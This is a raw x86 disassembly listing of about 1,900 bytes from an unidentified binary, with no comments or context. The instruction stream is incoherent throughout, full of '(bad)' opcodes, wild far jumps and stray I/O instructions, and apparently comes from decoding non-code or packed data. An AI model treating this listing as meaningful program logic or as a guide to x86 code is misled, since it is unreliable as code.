  40be56:	fsub   DWORD PTR [edx]
  40be58:	xor    edi,DWORD PTR [edi]
  40be5a:	xor    BYTE PTR [edx-0x1357a380],dl
  40be60:	(bad)  
  40be61:	or     eax,0x3ed4de47
  40be66:	lahf   
  40be67:	xor    ecx,0x207f5d93
  40be6d:	mov    ebp,0xef6434bd
  40be72:	xchg   ebp,eax
  40be73:	sbb    eax,0xf71ac4a1
  40be78:	mov    ah,0xd7
  40be7a:	sub    DWORD PTR [edx-0x2d],esi
  40be7d:	aad    0x84
  40be7f:	daa    
  40be80:	loopne 0x40bee4
  40be82:	(bad)  
  40be83:	out    0x8a,eax
  40be85:	sbb    al,0x78
  40be87:	das    
  40be88:	cmp    DWORD PTR [esi-0x2e],ebp
  40be8b:	pop    ebx
  40be8c:	pushf  
  40be8d:	bswap  edx
  40be8f:	sar    DWORD PTR [eax+0x414e50aa],1
  40be95:	mov    edx,0xe72d59e3
  40be9a:	rcl    edi,1
  40be9c:	pushf  
  40be9d:	sub    eax,DWORD PTR [ecx-0x5d46cd84]
  40bea3:	sahf   
  40bea4:	out    dx,eax
  40bea5:	dec    edx
  40bea6:	mov    ebx,ebx
  40bea8:	fnsave [ecx-0x5487a32]
  40beae:	sub    ebx,DWORD PTR [esi-0x663db12f]
  40beb4:	push   0x10df0586
  40beb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beba:	popf   
  40bebb:	jo     0x40be77
  40bebd:	loope  0x40bec1
  40bebf:	add    al,0x7d
  40bec1:	ds test eax,0x65eca013
  40bec7:	mov    eax,0x6fd826bd
  40becc:	adc    eax,edi
  40bece:	jns    0x40beef
  40bed0:	push   edx
  40bed1:	sub    DWORD PTR [edi-0x18],esp
  40bed4:	ret    0xd957
  40bed7:	data16 mov ch,0xe2
  40beda:	mov    dl,0xf1
  40bedc:	lds    edx,FWORD PTR [ebx-0x58]
  40bedf:	rcl    ebx,1
  40bee1:	mov    bh,0x24
  40bee3:	frstor [edi+0x3]
  40bee6:	fsub   QWORD PTR [ecx]
  40bee8:	pushf  
  40bee9:	xlat   BYTE PTR ds:[ebx]
  40beea:	jno    0x40bf2b
  40beec:	push   esi
  40beed:	jae    0x40beab
  40beef:	xor    al,0x41
  40bef1:	and    eax,0x2126145c
  40bef6:	lahf   
  40bef7:	ins    BYTE PTR es:[edi],dx
  40bef8:	and    eax,0xabdf7478
  40befd:	loopne 0x40bf0d
  40beff:	cmp    BYTE PTR [eax-0x8],cl
  40bf02:	jl     0x40bec3
  40bf04:	xchg   esp,eax
  40bf05:	jecxz  0x40beac
  40bf07:	or     eax,0x5af66a31
  40bf0c:	jmp    0x20f7fe3a
  40bf11:	(bad)  
  40bf12:	sar    DWORD PTR [ebx+0x7a9eec01],1
  40bf18:	xchg   ebp,eax
  40bf19:	fs (bad) 
  40bf1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf1c:	mov    WORD PTR [edx+0x7c],ss
  40bf1f:	mov    ds:0x435b2f1a,eax
  40bf24:	or     BYTE PTR [edx+0x5aecf882],al
  40bf2a:	daa    
  40bf2b:	and    dl,BYTE PTR [ebx]
  40bf2d:	mov    ebp,0x37c1af50
  40bf32:	xor    eax,0xb376686d
  40bf37:	pop    ds
  40bf38:	mov    ah,0x7
  40bf3a:	jmp    0xa11f:0x17f9f36f
  40bf41:	add    eax,0x3c1833ca
  40bf47:	fadd   DWORD PTR [ebx]
  40bf49:	cmp    DWORD PTR [edx],edx
  40bf4b:	in     eax,dx
  40bf4c:	xchg   ebx,eax
  40bf4d:	mov    edx,0x5e359cc0
  40bf52:	lahf   
  40bf53:	jae    0x40bf87
  40bf55:	add    BYTE PTR [esi+0x5f],dh
  40bf58:	inc    edx
  40bf59:	stc    
  40bf5a:	daa    
  40bf5b:	in     al,0x66
  40bf5d:	test   al,0x87
  40bf5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf60:	jbe    0x40bf76
  40bf62:	retf   0xabc9
  40bf65:	or     dl,0xf1
  40bf68:	dec    ebp
  40bf69:	adc    eax,0x9a4478ec
  40bf6e:	mov    BYTE PTR [ebx],al
  40bf70:	or     eax,0x65be1368
  40bf75:	inc    eax
  40bf76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf77:	ins    BYTE PTR es:[edi],dx
  40bf78:	retf   
  40bf79:	(bad)  
  40bf7a:	push   ss
  40bf7b:	stos   BYTE PTR es:[edi],al
  40bf7c:	dec    esp
  40bf7d:	and    BYTE PTR [ebx-0x7573c710],bl
  40bf83:	jno    0x40bf88
  40bf85:	(bad)  
  40bf86:	push   0x68682d46
  40bf8b:	push   ss
  40bf8c:	sub    cl,BYTE PTR [edi-0x34]
  40bf8f:	nop
  40bf90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf91:	jl     0x40bf36
  40bf93:	mov    ecx,DWORD PTR [ebx]
  40bf95:	mov    ebx,0x750819a5
  40bf9a:	xchg   ebx,eax
  40bf9b:	xchg   ecx,eax
  40bf9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf9d:	mov    dh,BYTE PTR [edx+0x2f]
  40bfa0:	pushf  
  40bfa1:	inc    ebp
  40bfa2:	xchg   esp,eax
  40bfa3:	adc    DWORD PTR [esi],edx
  40bfa5:	sahf   
  40bfa6:	out    dx,al
  40bfa7:	push   ecx
  40bfa8:	popa   
  40bfa9:	ins    DWORD PTR es:[edi],dx
  40bfaa:	data16 sti 
  40bfac:	ins    BYTE PTR es:[edi],dx
  40bfad:	clc    
  40bfae:	mov    edi,esi
  40bfb0:	test   al,0x85
  40bfb2:	test   DWORD PTR cs:[ebx+0x40],eax
  40bfb6:	enter  0x5182,0x87
  40bfba:	cmp    esp,DWORD PTR [ebx+ecx*4+0x61668b1e]
  40bfc1:	icebp  
  40bfc2:	mov    al,0x72
  40bfc4:	aaa    
  40bfc5:	adc    DWORD PTR [edx-0xf0b0bd2],ebx
  40bfcb:	or     eax,0x68ef8b00
  40bfd0:	(bad)  
  40bfd1:	je     0x40bff4
  40bfd3:	fidiv  DWORD PTR [esi+0x5e]
  40bfd6:	outs   dx,DWORD PTR ss:[esi]
  40bfd8:	push   edi
  40bfd9:	test   DWORD PTR ds:[ecx],eax
  40bfdc:	pop    es
  40bfdd:	repnz std 
  40bfdf:	pop    esi
  40bfe0:	sub    al,0x6e
  40bfe2:	je     0x40bf9b
  40bfe4:	cli    
  40bfe5:	js     0x40c059
  40bfe7:	(bad)  
  40bfe8:	xchg   DWORD PTR [ecx+0x61],esp
  40bfeb:	jno    0x40c022
  40bfed:	cmp    DWORD PTR [edx],0x66624b9b
  40bff3:	(bad)
  40bff6:	add    esi,DWORD PTR [ebp-0x2f]
  40bff9:	shr    DWORD PTR [esi-0x5f941ba4],0x82
  40c000:	je     0x40c057
  40c002:	and    DWORD PTR [ebx+0x57c7e719],ebp
  40c008:	gs push esp
  40c00a:	mov    ds:0x76055a8f,al
  40c00f:	aad    0xf5
  40c011:	inc    eax
  40c012:	stos   DWORD PTR es:[edi],eax
  40c013:	sbb    DWORD PTR [eax-0x15f5b295],esp
  40c019:	mov    esi,0xe4670595
  40c01e:	xchg   BYTE PTR [ebx+0x72],cl
  40c021:	arpl   WORD PTR ds:0x90bb1551,cx
  40c027:	call   0x89:0x578a0ce4
  40c02e:	mov    ebp,0x8a7cc870
  40c034:	fist   WORD PTR [ebx-0xb638cc]
  40c03a:	hlt    
  40c03b:	cwde   
  40c03c:	test   DWORD PTR [esi],eax
  40c03e:	stos   BYTE PTR es:[edi],al
  40c03f:	in     al,dx
  40c040:	xor    BYTE PTR [esi-0x33],ah
  40c043:	xor    DWORD PTR [eax+0x20],0x2d
  40c047:	fcomp  QWORD PTR [ebx-0x80]
  40c04a:	push   ss
  40c04b:	sub    eax,0x12e1ed30
  40c050:	pop    DWORD PTR [ecx-0x4b5c721a]
  40c056:	jmp    0x40c0a7
  40c058:	adc    eax,0x64eae420
  40c05d:	dec    edx
  40c05e:	popf   
  40c05f:	in     eax,0x18
  40c061:	jne    0x40c0c5
  40c063:	icebp  
  40c064:	mov    ecx,0xa27666e9
  40c069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c06a:	ds mov edx,0x51337cbf
  40c070:	pusha  
  40c071:	inc    esi
  40c072:	jmp    0xd87b:0xbb70e5e0
  40c079:	cli    
  40c07a:	mov    ds:0xb0b906ec,al
  40c080:	loopne 0x40c08b
  40c082:	push   esp
  40c083:	mov    ds:0xdbed88b7,eax
  40c088:	aam    0x7e
  40c08a:	or     DWORD PTR [edx+0x1c],edx
  40c08d:	cli    
  40c08e:	inc    ecx
  40c08f:	adc    esp,0x2c
  40c092:	xchg   ebx,eax
  40c093:	std    
  40c094:	mov    esi,0xf7288128
  40c099:	jae    0x40c0a3
  40c09b:	sbb    bl,BYTE PTR [esi]
  40c09d:	dec    esi
  40c09e:	call   0x54eed36c
  40c0a3:	mov    bh,0x6e
  40c0a5:	push   0x51
  40c0a7:	gs push esp
  40c0a9:	int3   
  40c0aa:	mov    ecx,0x3c61780b
  40c0af:	cdq    
  40c0b0:	fwait
  40c0b1:	iret   
  40c0b2:	jge    0x40c100
  40c0b4:	inc    BYTE PTR ds:0xcb426d44
  40c0ba:	mov    esp,0xf7a3e2e8
  40c0bf:	xchg   esi,eax
  40c0c0:	div    ah
  40c0c2:	push   ss
  40c0c3:	xor    BYTE PTR [eax-0x25ee0287],ch
  40c0c9:	or     bh,BYTE PTR [eax]
  40c0cb:	push   esp
  40c0cc:	and    DWORD PTR [edx-0x6f],ebx
  40c0cf:	test   DWORD PTR [ebp+ecx*1-0x65313e8a],edi
  40c0d6:	push   edx
  40c0d7:	in     al,0xf
  40c0d9:	aam    0x12
  40c0db:	shr    DWORD PTR [eax],cl
  40c0dd:	fmul   QWORD PTR [edx+0x29]
  40c0e0:	into   
  40c0e1:	(bad)  
  40c0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0e3:	inc    ebx
  40c0e4:	xor    esi,ebx
  40c0e6:	push   ds
  40c0e7:	inc    ebp
  40c0e8:	and    ecx,DWORD PTR [ebx]
  40c0ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0eb:	ja     0x40c0d2
  40c0ed:	push   esp
  40c0ee:	add    dl,ah
  40c0f0:	or     bl,BYTE PTR [ecx-0x60]
  40c0f3:	add    esi,edx
  40c0f5:	ret    0x5a3f
  40c0f8:	cmp    DWORD PTR [ecx+edx*1+0xbd62c1b],0xffffffc1
  40c100:	jmp    0x5937:0x4c80b924
  40c107:	sbb    DWORD PTR [ecx-0x9],esp
  40c10a:	in     eax,dx
  40c10b:	int3   
  40c10c:	(bad)  
  40c10d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c10e:	mov    esi,0x71cce99f
  40c113:	sti    
  40c114:	or     DWORD PTR [edi-0x37d984af],0x4c1ff4b1
  40c11e:	xchg   ecx,eax
  40c11f:	out    0x36,al
  40c121:	mov    eax,ds:0x955ac90b
  40c126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c127:	mov    ecx,fs
  40c129:	xlat   BYTE PTR ds:[ebx]
  40c12a:	lock fist WORD PTR ds:[ecx+0x33]
  40c12f:	icebp  
  40c130:	inc    edi
  40c131:	dec    esp
  40c132:	mov    ebx,0x2b0c6100
  40c137:	xchg   esi,eax
  40c138:	jle    0x40c143
  40c13a:	jae    0x40c0ce
  40c13c:	mov    edi,0xd7410793
  40c141:	je     0x40c152
  40c143:	outs   dx,BYTE PTR ds:[esi]
  40c144:	in     eax,0x52
  40c146:	and    eax,DWORD PTR [ebx+0x3c9d454f]
  40c14c:	push   ss
  40c14d:	inc    ecx
  40c14e:	add    DWORD PTR [eax-0x542c6ccd],ebp
  40c154:	test   DWORD PTR [edx+ebp*1+0x3e],esi
  40c158:	xchg   esi,eax
  40c159:	pop    ecx
  40c15a:	jne    0x40c177
  40c15c:	sbb    DWORD PTR [eax+ebx*1],eax
  40c15f:	enter  0x5d7c,0x17
  40c163:	mov    ?,WORD PTR [ebp-0x2e]
  40c166:	cmp    al,0x4
  40c168:	xlat   BYTE PTR ds:[ebx]
  40c169:	pop    es
  40c16a:	jp     0x40c156
  40c16c:	(bad)  
  40c16d:	mov    ebx,0xedeab7b1
  40c172:	add    al,BYTE PTR [eax-0x67f75cc9]
  40c178:	adc    BYTE PTR [eax],ch
  40c17a:	adc    bh,BYTE PTR [ebp-0x42]
  40c17d:	mov    al,0xef
  40c17f:	jbe    0x40c150
  40c181:	cmc    
  40c182:	lea    ebp,[ebx+0x5a07668c]
  40c188:	xor    DWORD PTR [ecx-0xc4440c2],edx
  40c18e:	and    ah,bl
  40c190:	xchg   esi,eax
  40c191:	jl     0x40c120
  40c193:	not    DWORD PTR [edx+0x4afae9c2]
  40c199:	cwde   
  40c19a:	out    0xf8,al
  40c19c:	dec    ebp
  40c19d:	dec    ebx
  40c19e:	scas   al,BYTE PTR es:[edi]
  40c19f:	push   0x79
  40c1a1:	push   edx
  40c1a2:	stos   DWORD PTR es:[edi],eax
  40c1a3:	(bad)  
  40c1a4:	rcr    DWORD PTR [edx+0x3b],cl
  40c1a7:	xchg   edx,eax
  40c1a8:	jne    0x40c1f6
  40c1aa:	jge    0x40c1b9
  40c1ac:	imul   edx,DWORD PTR [ebx],0xffffff91
  40c1af:	popf   
  40c1b0:	add    BYTE PTR [esp+edx*4],bh
  40c1b3:	aad    0x12
  40c1b5:	sbb    DWORD PTR [edx-0x7d],ecx
  40c1b8:	inc    ebp
  40c1b9:	std    
  40c1ba:	xchg   DWORD PTR [edx-0x7a],esp
  40c1bd:	ins    BYTE PTR es:[edi],dx
  40c1be:	lock cmp al,bl
  40c1c1:	sbb    al,0xaa
  40c1c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1c4:	(bad)  
  40c1c5:	sbb    BYTE PTR [edx+0x5ca8596d],dl
  40c1cb:	pop    ebx
  40c1cc:	and    BYTE PTR [edi-0x28600d8f],bh
  40c1d2:	(bad)  
  40c1d3:	ror    DWORD PTR [ecx],1
  40c1d5:	dec    esi
  40c1d6:	mov    ah,0x26
  40c1d8:	pop    es
  40c1d9:	cdq    
  40c1da:	ret    
  40c1db:	mov    BYTE PTR [ebp+0x75],ah
  40c1de:	pop    ds
  40c1df:	imul   edx,DWORD PTR [edx+eiz*4+0xc],0xfa6497e6
  40c1e7:	test   eax,0x6b93cbfa
  40c1ec:	inc    eax
  40c1ed:	sub    ah,0x44
  40c1f0:	ja     0x40c266
  40c1f2:	bound  eax,QWORD PTR [edx+ebp*1-0x65]
  40c1f6:	push   cs
  40c1f7:	fldenv [ebx]
  40c1f9:	aad    0x5c
  40c1fb:	das    
  40c1fc:	xor    esp,DWORD PTR [esi-0x2ad11859]
  40c202:	imul   esi,DWORD PTR [ecx],0xffffffe5
  40c205:	mov    ?,WORD PTR [esi]
  40c207:	adc    eax,0x4d9a5bfd
  40c20c:	repz and BYTE PTR [edi-0x2c],0x2f
  40c211:	sbb    BYTE PTR [ebx],ch
  40c213:	pop    eax
  40c214:	pop    esp
  40c215:	daa    
  40c216:	sbb    eax,0x7e6b29ed
  40c21b:	fwait
  40c21c:	push   esi
  40c21d:	rcl    BYTE PTR [esi],0xf3
  40c220:	adc    al,0xfb
  40c222:	or     eax,0x90ec709c
  40c227:	nop
  40c228:	mov    edi,0x8c892e66
  40c22d:	dec    ebx
  40c22e:	cs (bad) 
  40c230:	or     al,0x8e
  40c232:	adc    al,0x91
  40c234:	clc    
  40c235:	fsubr  DWORD PTR [ecx+ebp*1+0x7c6eed97]
  40c23c:	adc    al,0x12
  40c23e:	xor    ah,bh
  40c240:	nop
  40c241:	mov    ah,0x27
  40c243:	xchg   edi,eax
  40c244:	(bad)  
  40c245:	mov    ebp,0xfdf082a
  40c24a:	cwde   
  40c24b:	call   0xe65c:0xd89655b8
  40c252:	mov    al,0xde
  40c254:	pop    ebx
  40c255:	rcr    DWORD PTR [ecx-0x779e0a],1
  40c25b:	xor    al,0x4c
  40c25d:	dec    eax
  40c25e:	clc    
  40c25f:	test   bh,dh
  40c261:	xchg   esp,eax
  40c262:	call   0xe6b53008
  40c267:	inc    edi
  40c268:	add    edi,DWORD PTR [edi+0x27624b48]
  40c26e:	cld    
  40c26f:	xor    esp,edi
  40c271:	dec    eax
  40c272:	mov    edi,DWORD PTR [bp+0x31]
  40c276:	(bad)  
  40c277:	mov    al,ss:0x25b35591
  40c27d:	fnstenvw [edi+0x4e6e0122]
  40c284:	mov    ch,0xb3
  40c286:	arpl   WORD PTR [edx+0x7a],bx
  40c289:	fldpi  
  40c28b:	mov    dh,dl
  40c28d:	bound  ebx,QWORD PTR [edi]
  40c28f:	(bad)  
  40c290:	hlt    
  40c291:	test   DWORD PTR [edx+0xc1f909c],esi
  40c297:	call   0x560f78c6
  40c29c:	pop    ecx
  40c29d:	std    
  40c29e:	fldenv [esi-0x5d]
  40c2a1:	mov    ebp,eax
  40c2a3:	aad    0x24
  40c2a5:	cmp    eax,0xae9b39b2
  40c2aa:	int    0xf1
  40c2ac:	ss pop es
  40c2ae:	add    al,0x4c
  40c2b0:	mov    fs,edx
  40c2b2:	mov    bh,0x8b
  40c2b4:	retf   
  40c2b5:	lahf   
  40c2b6:	or     BYTE PTR [edx-0x1e3c5c81],ah
  40c2bc:	xchg   ebx,eax
  40c2bd:	retf   0x356c
  40c2c0:	sub    eax,0x32b87017
  40c2c5:	hlt    
  40c2c6:	mov    eax,0x14f01a37
  40c2cb:	rcl    dh,1
  40c2cd:	hlt    
  40c2ce:	stos   BYTE PTR es:[edi],al
  40c2cf:	xor    DWORD PTR [edi+0x64],ecx
  40c2d2:	sbb    eax,0x1db37e44
  40c2d7:	test   bh,ch
  40c2d9:	mov    eax,ds:0x50cf7f24
  40c2de:	mov    eax,ds:0xfef6d180
  40c2e3:	stos   BYTE PTR es:[edi],al
  40c2e4:	ret    0x8f8a
  40c2e7:	sbb    eax,edi
  40c2e9:	or     al,0x58
  40c2eb:	(bad)  
  40c2ec:	push   ecx
  40c2ed:	jb     0x40c36c
  40c2ef:	(bad)  
  40c2f0:	stos   DWORD PTR es:[edi],eax
  40c2f1:	ret    
  40c2f2:	push   0x5c295b0
  40c2f7:	call   0x7291:0x2985331a
  40c2fe:	lods   eax,DWORD PTR ds:[esi]
  40c2ff:	jno    0x40c2e7
  40c301:	add    edi,DWORD PTR [ebx+0x27]
  40c304:	test   al,0x2e
  40c306:	pop    es
  40c307:	adc    dl,BYTE PTR [ecx-0x4e]
  40c30a:	xchg   esp,eax
  40c30b:	loopne 0x40c2cf
  40c30d:	rcr    BYTE PTR [eax],1
  40c30f:	mov    dh,0xde
  40c311:	daa    
  40c312:	ja     0x40c363
  40c314:	pop    ebp
  40c315:	mov    ch,cl
  40c317:	imul   ecx,DWORD PTR [edi+0x746a7bd7],0x7493cb70
  40c321:	push   esi
  40c322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c323:	jne    0x40c2f7
  40c325:	or     cl,BYTE PTR [edi-0x6b]
  40c328:	int3   
  40c329:	int3   
  40c32a:	pop    eax
  40c32b:	fisttp WORD PTR [edi+0x5198cc66]
  40c331:	xchg   ecx,eax
  40c332:	inc    edx
  40c333:	jge    0x40c31a
  40c335:	loopne 0x40c2e2
  40c337:	sbb    eax,0xcc9cd273
  40c33c:	push   edx
  40c33d:	or     ebx,edx
  40c33f:	bound  ecx,QWORD PTR [eax-0x4b]
  40c342:	mov    al,ds:0x2dea90bd
  40c347:	pushf  
  40c348:	cmp    BYTE PTR ds:0xf9cde0f2,dl
  40c34e:	out    0x72,eax
  40c350:	jne    0x40c351
  40c352:	dec    cl
  40c354:	(bad)  
  40c355:	mov    edx,ds
  40c357:	jns    0x40c3b8
  40c359:	(bad)  
  40c35a:	rol    DWORD PTR [eax+0x2a],1
  40c35d:	adc    edx,DWORD PTR [esp+ecx*4+0x1d]
  40c361:	in     al,dx
  40c362:	(bad)  
  40c363:	cmc    
  40c364:	push   ecx
  40c365:	aaa    
  40c366:	push   edx
  40c367:	inc    edi
  40c368:	sub    al,0xe1
  40c36a:	xlat   BYTE PTR ds:[ebx]
  40c36b:	stc    
  40c36c:	lds    edi,FWORD PTR [edx+0x336c2364]
  40c372:	mov    edx,ebx
  40c374:	in     eax,dx
  40c375:	adc    DWORD PTR [ebp+0x31],ecx
  40c378:	jge    0x40c32b
  40c37a:	push   es
  40c37b:	ja     0x40c3b1
  40c37d:	adc    eax,0xbe2275bc
  40c382:	pop    edx
  40c383:	fcmove st,st(3)
  40c385:	mov    BYTE PTR [ecx+0x18],bh
  40c388:	shr    DWORD PTR [edi+0x68],cl
  40c38b:	mov    ebp,0x614681c3
  40c390:	ins    BYTE PTR es:[edi],dx
  40c391:	push   edx
  40c392:	mov    WORD PTR [esi-0x4184f847],ss
  40c398:	or     BYTE PTR [ecx-0x48e1d711],al
  40c39e:	push   ebp
  40c39f:	push   ss
  40c3a0:	in     eax,0x3e
  40c3a2:	and    DWORD PTR [ecx],0xbe7a1876
  40c3a8:	inc    esp
  40c3a9:	mov    ah,0x4f
  40c3ab:	frstor [esi+0x72]
  40c3ae:	add    edi,DWORD PTR ds:0x708f0ca0
  40c3b4:	mov    ecx,0xbef527bd
  40c3b9:	xor    eax,0xd07955e5
  40c3be:	mov    ecx,edx
  40c3c0:	sbb    al,BYTE PTR [edi+0x27a9ab02]
  40c3c6:	outs   dx,DWORD PTR ds:[esi]
  40c3c7:	jo     0x40c3f5
  40c3c9:	ins    BYTE PTR es:[edi],dx
  40c3ca:	sbb    eax,0x714f8836
  40c3cf:	mov    ch,0xf3
  40c3d1:	stos   BYTE PTR es:[edi],al
  40c3d2:	push   edi
  40c3d3:	add    bh,BYTE PTR [edx-0x19]
  40c3d6:	xor    ecx,DWORD PTR [edi+0x6a]
  40c3d9:	or     eax,0xe16506dd
  40c3de:	ss mov cl,0x57
  40c3e1:	daa    
  40c3e2:	push   es
  40c3e3:	stos   DWORD PTR es:[edi],eax
  40c3e4:	inc    eax
  40c3e5:	push   ebp
  40c3e6:	push   es
  40c3e7:	push   eax
  40c3e8:	in     al,dx
  40c3e9:	cmp    ebp,DWORD PTR [esi]
  40c3eb:	call   0x41ebbcfc
  40c3f0:	hlt    
  40c3f1:	push   ebp
  40c3f2:	or     DWORD PTR [edx],0xffffff9e
  40c3f5:	inc    edx
  40c3f6:	fcomp  st(5)
  40c3f8:	(bad)  
  40c3f9:	call   0x72b08e64
  40c3fe:	jp     0x40c45e
  40c400:	cmp    al,0xa1
  40c402:	stos   DWORD PTR es:[edi],eax
  40c403:	sbb    BYTE PTR [eax+esi*2-0x25],al
  40c407:	mov    eax,0x510ca081
  40c40c:	sbb    DWORD PTR [esi],edi
  40c40e:	cmp    eax,0xbeb72824
  40c413:	push   cs
  40c414:	pop    ebx
  40c415:	lock sub dh,BYTE PTR [edx]
  40c418:	iret   
  40c419:	push   ds
  40c41a:	push   ebx
  40c41b:	add    al,0x39
  40c41d:	jecxz  0x40c42a
  40c41f:	int    0xae
  40c421:	bound  esi,QWORD PTR [edx+0x17d545ce]
  40c427:	(bad)  
  40c428:	pop    eax
  40c429:	imul   ebp,DWORD PTR ds:0x4611e51b,0x7112879b
  40c433:	jo     0x40c45d
  40c435:	xor    DWORD PTR ds:[edx-0x5cd5e701],ebp
  40c43c:	leave  
  40c43d:	cmc    
  40c43e:	inc    edi
  40c43f:	lahf   
  40c440:	fwait
  40c441:	pop    es
  40c442:	push   ss
  40c443:	test   eax,0x44a4f09e
  40c448:	ss aaa 
  40c44a:	lods   eax,DWORD PTR ds:[esi]
  40c44b:	imul   edi,DWORD PTR [edi+0xff2201],0xac245d7c
  40c455:	adc    eax,0x3efb9b27
  40c45a:	pop    eax
  40c45b:	test   eax,0xe7ed811d
  40c460:	sub    BYTE PTR [edi],al
  40c462:	adc    eax,0xb69902e1
  40c467:	push   cs
  40c468:	out    0x7,al
  40c46a:	pop    ebp
  40c46b:	or     al,0x1b
  40c46d:	push   0x80f15814
  40c472:	sub    BYTE PTR [ecx],dl
  40c474:	hlt    
  40c475:	loop   0x40c49c
  40c477:	and    eax,0x46c3a22b
  40c47c:	mov    ?,WORD PTR [edi+0x3b]
  40c47f:	adc    al,0x0
  40c481:	ins    DWORD PTR es:[edi],dx
  40c482:	and    BYTE PTR [ecx-0x20],bl
  40c485:	mov    esi,DWORD PTR [esi-0x2051f601]
  40c48b:	add    eax,0xfc5c3f3f
  40c490:	push   esi
  40c491:	mov    ds:0xe2bdd6b7,al
  40c496:	xchg   esp,eax
  40c497:	pop    ecx
  40c498:	xchg   DWORD PTR [edx-0xb55a5b4],esp
  40c49e:	sbb    esi,edi
  40c4a0:	add    BYTE PTR [eax+0x4635af32],0xba
  40c4a7:	dec    eax
  40c4a8:	in     eax,dx
  40c4a9:	adc    BYTE PTR [edi+0x57],cl
  40c4ac:	mov    dh,0x71
  40c4ae:	clc    
  40c4af:	shl    esp,1
  40c4b1:	sub    DWORD PTR [esi+edi*4+0x5169a3d7],ebx
  40c4b8:	dec    ecx
  40c4b9:	fsubr  QWORD PTR [ebp+0x511a8259]
  40c4bf:	xchg   edx,eax
  40c4c0:	jbe    0x40c51a
  40c4c2:	dec    edi
  40c4c3:	stc    
  40c4c4:	pop    esi
  40c4c5:	in     al,0x3
  40c4c7:	mov    edi,0xcbe0cbbf
  40c4cc:	xchg   esi,eax
  40c4cd:	aas    
  40c4ce:	xchg   edx,eax
  40c4cf:	xchg   ecx,eax
  40c4d0:	ret    
  40c4d1:	in     al,dx
  40c4d2:	lods   eax,DWORD PTR ds:[esi]
  40c4d3:	inc    esp
  40c4d4:	jmp    0xadbaf7c9
  40c4d9:	stos   BYTE PTR es:[edi],al
  40c4da:	add    cl,BYTE PTR [edi+0x6b]
  40c4dd:	sub    ch,dl
  40c4df:	or     BYTE PTR [edi],dh
  40c4e1:	out    0x63,al
  40c4e3:	pop    ecx
  40c4e4:	nop
  40c4e5:	(bad)  
  40c4e6:	pop    esp
  40c4e7:	fistp  QWORD PTR [ebp+ebx*4+0x69cb48a7]
  40c4ee:	dec    ecx
  40c4ef:	mov    BYTE PTR [esi],dl
  40c4f1:	out    0x56,eax
  40c4f3:	add    DWORD PTR [edx+0x7443f0ea],edx
  40c4f9:	test   eax,0xea7fcbb7
  40c4fe:	xchg   edx,eax
  40c4ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c500:	sar    bl,1
  40c502:	fld    TBYTE PTR [edi]
  40c504:	dec    ecx
  40c505:	sbb    DWORD PTR [ecx+edx*1],ecx
  40c508:	and    ch,BYTE PTR [edi+0x5a2f85c0]
  40c50e:	xchg   ecx,esp
  40c510:	hlt    
  40c511:	xor    BYTE PTR [edi],al
  40c513:	push   edi
  40c514:	sub    ah,BYTE PTR [eax]
  40c516:	outs   dx,BYTE PTR ds:[esi]
  40c517:	cs mov ebp,0xe991480c
  40c51d:	pop    eax
  40c51e:	push   ebp
  40c51f:	js     0x40c545
  40c521:	cmpxchg DWORD PTR ss:[eax-0x2d],edx
  40c526:	(bad)  
  40c527:	fcom   DWORD PTR [edx-0xc]
  40c52a:	fdiv   DWORD PTR [ebx]
  40c52c:	fcomp  DWORD PTR [eax+0xa]
  40c52f:	jnp    0x40c4cc
  40c531:	prefetchwt1 BYTE PTR [edi+0x56]
  40c535:	dec    edi
  40c536:	(bad)  
  40c537:	rcr    DWORD PTR [ebx+0x5e],1
  40c53a:	dec    ebx
  40c53b:	cmp    BYTE PTR [edx],cl
  40c53d:	cs ror bh,cl
  40c540:	out    0x46,eax
  40c542:	out    0x9c,eax
  40c544:	xchg   edi,eax
  40c545:	ins    DWORD PTR es:[edi],dx
  40c546:	mov    esi,0x25202400
  40c54b:	dec    esp
  40c54c:	pop    edi
  40c54d:	add    al,0x2c
  40c54f:	push   ebp
  40c550:	mov    ah,0x4d
  40c552:	xor    BYTE PTR [edi+0x24],ch
  40c555:	mov    ecx,0x6f610a92
  40c55a:	into   
  40c55b:	je     0x40c586
  40c55d:	das    
  40c55e:	das    
  40c55f:	fcom   DWORD PTR [edx+0x2]
  40c562:	test   eax,0xe52ff61f
  40c567:	lock popfw 
  40c56a:	or     BYTE PTR [ebx+0x5e523f28],bl
  40c570:	xchg   ecx,eax
  40c571:	lds    edx,FWORD PTR [edi]
  40c573:	(bad)  
  40c574:	adc    al,0x73
  40c576:	push   0xffffffb4
  40c578:	arpl   WORD PTR [ecx-0x46],sp
  40c57b:	xlat   BYTE PTR ds:[ebx]
  40c57c:	mov    cl,0x68
  40c57e:	ror    DWORD PTR [eax],cl
  40c580:	dec    eax
  40c581:	outs   dx,BYTE PTR ds:[esi]
  40c582:	in     al,0x60
  40c584:	adc    DWORD PTR [eiz*8+0x85a8806],edx
  40c58b:	(bad)  
  40c58c:	(bad)  
  40c58e:	inc    esp
  40c58f:	call   0xd6c5cf82
  40c594:	adc    BYTE PTR [ecx],0xa4
  40c597:	add    al,BYTE PTR [ebp+0x68aa6092]
  40c59d:	les    esp,FWORD PTR [esi-0x4f0f148c]
  40c5a3:	into   
  40c5a4:	xor    esp,DWORD PTR [edx+0x3893434e]
  40c5aa:	push   esp
  40c5ab:	sub    ebx,ebp
  40c5ad:	dec    edi
  40c5ae:	(bad)  
  40c5af:	das    
  40c5b0:	push   ds
  40c5b1:	xor    al,0x31
  40c5b3:	mov    eax,0x50cd2550
  40c5b8:	jl     0x40c58a
  40c5ba:	sub    esi,ecx
  40c5bc:	lods   eax,DWORD PTR ds:[esi]
  40c5bd:	outs   dx,DWORD PTR ds:[esi]
